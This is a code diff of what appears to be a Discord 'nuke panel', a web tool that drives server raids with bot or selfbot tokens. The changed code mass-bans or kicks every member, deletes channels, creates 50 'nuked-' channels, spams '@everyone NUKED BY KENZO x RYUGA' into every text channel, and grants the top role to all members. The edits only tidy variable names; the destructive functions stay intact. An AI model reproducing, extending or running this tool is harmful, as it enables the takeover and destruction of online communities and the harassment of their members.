@@ -565,36 +565,36 @@
       return members;
     }
 
-    async function runCommand(tag, auth, command) {
-      const guildId = $('' + tag.toLowerCase() + 'ServerId').value.trim();
+    async function runCommand(tag, prefix, auth, command) {
+      const serverId = $('' + prefix + 'ServerId').value.trim();
 
-      if (command !== 'SPAM_ALL' && !guildId) {
+      if (!serverId) {
         log('[' + tag + '] Please enter Server ID first', 'error');
         return;
       }
-      if (!/^\d{17,20}$/.test(guildId)) {
+      if (!/^\d{17,20}$/.test(serverId)) {
         log('[' + tag + '] Server ID must be 17-20 digits', 'error');
         return;
       }
 
       let done = 0, failed = 0;
-      const bump = (ok) => { ok ? done++ : failed++; };
+      const bump = (ok) => { if (ok) done++; else failed++; };
 
       try {
         log('[' + tag + '] ▶ Running ' + command + '...', 'info');
 
         if (command === 'BAN_ALL' || command === 'KICK_ALL') {
           const me = await apiCall(auth, 'GET', '/users/@me');
-          const members = await getAllMembers(auth, guildId);
+          const members = await getAllMembers(auth, serverId);
           log('[' + tag + '] Found ' + members.length + ' members', 'info');
 
           for (const m of members) {
             if (m.user.id === me.id) continue;
             try {
               if (command === 'BAN_ALL') {
-                await apiCall(auth, 'PUT', '/guilds/' + guildId + '/bans/' + m.user.id, { reason: 'nuke panel' });
+                await apiCall(auth, 'PUT', '/guilds/' + serverId + '/bans/' + m.user.id, { reason: 'nuke panel' });
               } else {
-                await apiCall(auth, 'DELETE', '/guilds/' + guildId + '/members/' + m.user.id);
+                await apiCall(auth, 'DELETE', '/guilds/' + serverId + '/members/' + m.user.id);
               }
               bump(true);
             } catch (e) { bump(false); }
@@ -602,7 +602,7 @@
           }
 
         } else if (command === 'DELETE_ALL' || command === 'CREATE_CHANNELS' || command === 'SPAM_ALL') {
-          const channels = await apiCall(auth, 'GET', '/guilds/' + guildId + '/channels');
+          const channels = await apiCall(auth, 'GET', '/guilds/' + serverId + '/channels');
           log('[' + tag + '] Found ' + channels.length + ' channels', 'info');
 
           if (command === 'DELETE_ALL') {
@@ -614,7 +614,7 @@
           } else if (command === 'CREATE_CHANNELS') {
             for (let i = 0; i < 50; i++) {
               try {
-                await apiCall(auth, 'POST', '/guilds/' + guildId + '/channels', { name: 'nuked-' + (i + 1), type: 0 });
+                await apiCall(auth, 'POST', '/guilds/' + serverId + '/channels', { name: 'nuked-' + (i + 1), type: 0 });
                 bump(true);
               } catch (e) { bump(false); }
               await sleep(300);
@@ -624,7 +624,7 @@
               if (c.type !== 0 && c.type !== 5) continue;
               for (let i = 0; i < 5; i++) {
                 try {
-                  await apiCall(auth, 'POST', '/channels/' + c.id + '/messages', { content: '@everyone **NUKED BY KENZO x RYUGA** ' + '||'.repeat(1) + ' https://discord.gg/kenzo' });
+                  await apiCall(auth, 'POST', '/channels/' + c.id + '/messages', { content: '@everyone **NUKED BY KENZO x RYUGA**' });
                   bump(true);
                 } catch (e) { bump(false); }
                 await sleep(320);
@@ -633,16 +633,16 @@
           }
 
         } else if (command === 'CLAIM_ROLES') {
-          const roles = await apiCall(auth, 'GET', '/guilds/' + guildId + '/roles');
-          const target = roles.slice().sort((a, b) => b.position - a.position)[0];
-          if (!target) { log('[' + tag + '] No roles found', 'error'); return; }
+          const roles = await apiCall(auth, 'GET', '/guilds/' + serverId + '/roles');
+          const target = roles.filter((r) => r.position > 0).sort((a, b) => b.position - a.position)[0];
+          if (!target) { log('[' + tag + '] No assignable role found', 'error'); return; }
 
-          const members = await getAllMembers(auth, guildId);
+          const members = await getAllMembers(auth, serverId);
           log('[' + tag + '] Claiming role "' + target.name + '" on ' + members.length + ' members', 'info');
 
           for (const m of members) {
             try {
-              await apiCall(auth, 'PATCH', '/guilds/' + guildId + '/members/' + m.user.id, { roles: [target.id, ...(m.roles || [])] });
+              await apiCall(auth, 'PATCH', '/guilds/' + serverId + '/members/' + m.user.id, { roles: [target.id, ...(m.roles || [])] });
               bump(true);
             } catch (e) { bump(false); }
             await sleep(280);
@@ -658,13 +658,13 @@
     function sendAppBotCommand(command) {
       if (!appBotConnected) { log('[APP BOT] Connect first', 'error'); return; }
       const token = 'Bot ' + $('appbotToken').value.trim();
-      runCommand('APP BOT', token, command);
+      runCommand('APP BOT', 'appbot', token, command);
     }
 
     function sendSelfbotCommand(command) {
       if (!selfBotConnected) { log('[SELFBOT] Connect first', 'error'); return; }
       const token = $('selfbotToken').value.trim();
-      runCommand('SELFBOT', token, command);
+      runCommand('SELFBOT', 'selfbot', token, command);
     }
     
     // ==================== SELFBOT (Direct WebSocket) ====================
